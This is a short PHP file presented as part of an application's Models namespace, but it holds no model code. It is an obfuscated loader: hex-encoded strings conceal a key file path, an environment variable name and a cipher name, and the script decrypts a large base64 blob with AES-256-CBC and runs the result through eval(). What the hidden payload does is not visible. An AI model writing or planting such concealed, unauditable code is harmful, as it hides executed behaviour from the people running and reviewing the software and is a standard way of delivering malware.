<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('TwnosDmP1mpTOd3dkkqypQ==');

$c=base64_decode(

'TVG4KWz8W3mi2DhgS/ahzDtaisOecRibMDB2GsVJ0tvPk5s9FN2PKDk+Cc5uEoSvujbrUPo/Oh93' .
'9bW33b19p1N81hnxuopO+pvMBW4E3lGWc/2EV7enuReykUEknHKLMNXP7O+cUj9QYS4Ixevu6af3' .
'91FR8ymP10DB9CFbVdeQjDd9DSORXobUs5L/JorRslkiolNXVb2vPO+g5eOeRWCnAu9gPHElIlwN' .
'eYk63rPv0tSBla/+hvRY3dPfpyuKWoOcwl3GWhW2EF3dS6Pu7iwLQtZ2oLPNedMVw4sDY+syYs6Q' .
'e3jHcnfNtSmOR3ucud7vVDQmxUxAqPFx/Bd0cAdMboR6LuSFEhiKsvtTen5DCq4b8Dk+4a8vEpJm' .
'3qVOp69fBrFE59XIrXLTragnfFv+rnkwO4BkIBwEf9FTBqpgfLB2l1NE+tk5gUoGCqQ8NipCjrFv' .
'xNBrXJcyd2E0F7L49phNHQBwpKn/XW/xuzHwBfVhjRP1IZAL3oloj+OKeehH/Wo6aH9KA6mNExFZ' .
'l9+ChdQmvDhf+/moDl5ruNEDONUIxXP90Zp8Id1vWdScNfhUk/VOtSq73UcIDGdAslpmPqZiF/bR' .
'o/16HlTmG39dTRl57LzHzCcVWrLR896jKs2m5B8upQ3s5eItCJzRoLF4Bn5Hqpp0zTBEBVhBTO7Y' .
'dLtsUn0MI4xw1Q4loPt7TOlPRSNS/0KLeZZJgWHRpg/GXWSJfW4WnV4nl0Ptnc0AYzAASFfXrTdF' .
'+F6gZ3rFy2qg/PFzr38GLp7H8GhWY6AtmIp6xl7qA2FAJUl6VuEwdFfw+RP8csIj75ZvoODrY2Hy' .
'Qb9j3SC23i6vl7IarJylq8WQfO0hMKd6kl9x6H3AI9b5Wcg7qKbL1bRw+3ZhnE8OdNNTgkU0x2RJ' .
'j4DL2kFVABaPj/aRMvwnbk/I1K5LDZZSH0rhRhM0nJLqlx4RgGb/R0Tq4v8zNGuBBGPzsc+rrAAL' .
'OCg2NR3Q0auAYPUIXPmzex3UvPv3QhEHmDW4bLjxKkd9ZPE4ZCGuV/44puzC5YuTIzXSWmeyABkR' .
'WYxQY9NUVu3nMJXkecsmjbGWYLujU9X9Y7lUUUGNL5GVU1s4kkhI8vMnXKSv4PCBOPfMX4gttNzD' .
'vDacOMBPaFdIQeAofrahfTJI9ggROF/BUVuWPI23CQCEkLGjT6ZBHtStDGkYhiPF0FGSGn6/VZEX'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

